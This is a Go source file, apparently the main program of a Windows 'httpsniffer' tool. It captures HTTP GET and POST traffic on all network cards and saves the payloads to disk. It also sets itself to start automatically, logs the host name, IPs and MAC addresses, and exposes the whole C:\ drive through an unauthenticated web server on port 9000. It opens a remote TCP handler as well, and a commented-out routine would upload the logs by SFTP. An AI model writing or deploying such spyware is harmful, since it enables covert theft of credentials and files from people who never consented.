package main

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"httpsniffer/file"
	"httpsniffer/hardware"
	"httpsniffer/network"
	"httpsniffer/tcp_handle"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

var DEBUG int = 0
var NETWORK_DEBUG = 0

var homePath = os.Getenv("HOMEDRIVE")+os.Getenv("HOMEPATH")

func findAllNetCard() []string{
	netcards := []string{""}

	// Find all devices
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}


	// Print device information
	fmt.Println("Devices found:")
	for _, d := range devices {
		fmt.Println("\nName: ", d.Name)
		fmt.Println("Description: ", d.Description)
		fmt.Println("Devices addresses: ", d.Description)

		netcards = append(netcards, d.Name)

		for _, address := range d.Addresses {
			fmt.Println("- IP address: ", address.IP)
			fmt.Println("- Subnet mask: ", address.Netmask)
		}
	}

	return netcards
}

func catchHttpPacket(){

	canwrite := make(chan int, 1)
	canwrite <- 1
	select_ch := make(chan string, 1)

	for _,netCardName := range findAllNetCard(){
		fmt.Println("openLive :", netCardName)

		go func() {
			handle, err := pcap.OpenLive(netCardName, 1600, true, 30*time.Second)
			if err != nil {
				log.Fatal(err)
			}
			defer handle.Close()

			//设置过滤
			if err := handle.SetBPFFilter("tcp and (port 80)"); err != nil {
				log.Fatal(err)
			}

			packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

			packets := packetSource.Packets()

			for {
				select{
				case packet := <-packets:
					if packet == nil {
						return
					}

					if packet.NetworkLayer() == nil || packet.TransportLayer() == nil || packet.TransportLayer().LayerType() != layers.LayerTypeTCP {
						log.Println("Unusable packet")
						continue
					}

					tcp := packet.TransportLayer().(*layers.TCP)
					payload := string(tcp.BaseLayer.Payload)
					if strings.Contains(payload, "GET") || strings.Contains(payload, "POST") {
						log.Printf("payload:%v\n", payload)

						// lock
						<- canwrite

						//tansport msg to select
						select_ch <- netCardName

						if tcp_handle.IsWrite == 1{
							file.WriteWithOs(homePath+"/1.txt", payload)
						}

						//lock
						canwrite <- 1
					}

				}
			}
		}()
	}

	for {
		select {
		case n := <- select_ch:
			fmt.Println(n, ": written.")
		}
	}


}

func snifferHttp2(){
	catchHttpPacket()
}

func snifferHttp(){
	// Find all devices
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	var netCardName string

	// Print device information
	fmt.Println("Devices found:")
	for _, d := range devices {
		fmt.Println("\nName: ", d.Name)
		fmt.Println("Description: ", d.Description)
		fmt.Println("Devices addresses: ", d.Description)

		if strings.Contains( strings.ToLower(d.Description), "pcie") {
			netCardName = d.Name
			break
		}

		for _, address := range d.Addresses {
			fmt.Println("- IP address: ", address.IP)
			fmt.Println("- Subnet mask: ", address.Netmask)
		}
	}

	netCardName1 := "\\Device\\NPF_{A03165A0-9781-4C35-8298-FEC0E040754A}"
	netCardName2 := "\\Device\\NPF_{FFBAE5D2-88B7-4311-BE9A-09335FA9F87D}"
	netCardName3 := "\\Device\\NPF_{06B0A21C-66DF-43C6-B8BD-4BA7FA0B0903}" // XP virtual machine

	switch DEBUG{
	case 0:
		netCardName = netCardName
	case 1:
		netCardName = netCardName1
	case 2:
		netCardName = netCardName2
	case 3:
		netCardName = netCardName3
	}

	handle, err := pcap.OpenLive(netCardName, 1600, true, 30*time.Second)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	//设置过滤
	if err := handle.SetBPFFilter("tcp and (port 80)"); err != nil {
		log.Fatal(err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	packets := packetSource.Packets()

	for {
		select{
		case packet := <-packets:
			if packet == nil {
				return
			}

			if packet.NetworkLayer() == nil || packet.TransportLayer() == nil || packet.TransportLayer().LayerType() != layers.LayerTypeTCP {
				log.Println("Unusable packet")
				continue
			}

			tcp := packet.TransportLayer().(*layers.TCP)
			payload := string(tcp.BaseLayer.Payload)
			if strings.Contains(payload, "GET") || strings.Contains(payload, "POST") {
				log.Printf("payload:%v\n", payload)

				if tcp_handle.IsWrite == 1{
					file.WriteWithOs(homePath+"/1.txt", payload)
				}
			}

		}
	}
}

func httpServer(){
	dir, _ := filepath.Abs(filepath.Dir("C:\\"))
	http.Handle("/", http.FileServer(http.Dir(dir)))
	err := http.ListenAndServe(":9000", nil)
	if err != nil {
		fmt.Printf("%s\n", err)
	}
}

func main(){

	//sftp upload abandon
	//go func() {
	//	for {
	//		network.UpLoadFile(homePath+"/1.txt")
	//		fmt.Println("上传")
	//		time.Sleep(time.Minute * 10)
	//	}
	//}()

	//init config file.
	file.WriteConfigInit()
	//init IsWriteState
	isWrite, _ := file.WriteConfigRead()
	if isWrite{
		tcp_handle.IsWrite = 1
	}else{
		tcp_handle.IsWrite = 0
	}

	hardware.AutoStartUp()

if NETWORK_DEBUG == 0 {

	host := hardware.GetComName()
	file.WriteWithOs(homePath+"/2.txt", host+"\r\n")

	ips := hardware.GetIPs()
	file.WriteWithOs(homePath+"/2.txt", "ips:"+ips+"\r\n")

	macs := hardware.GetMacAddrs()
	file.WriteWithOs(homePath+"/2.txt", "macs:"+macs+"\r\n")
}

	//sftp upload abandon
	//network.UpLoadFile(homePath+"/2.txt")

	go httpServer()

	c := make(chan int)
	//启用广播服务
	go func(){
		network.BoardCastServer()
	}()


	//启用echo_server
	go func(){
		network.TcpRemote(tcp_handle.RemoteHandle)
	}()

if NETWORK_DEBUG == 1{

	select {
	case <- c:
		return
	}
}

	if NETWORK_DEBUG == 0{
		//snifferHttp()
		snifferHttp2()

	}
}

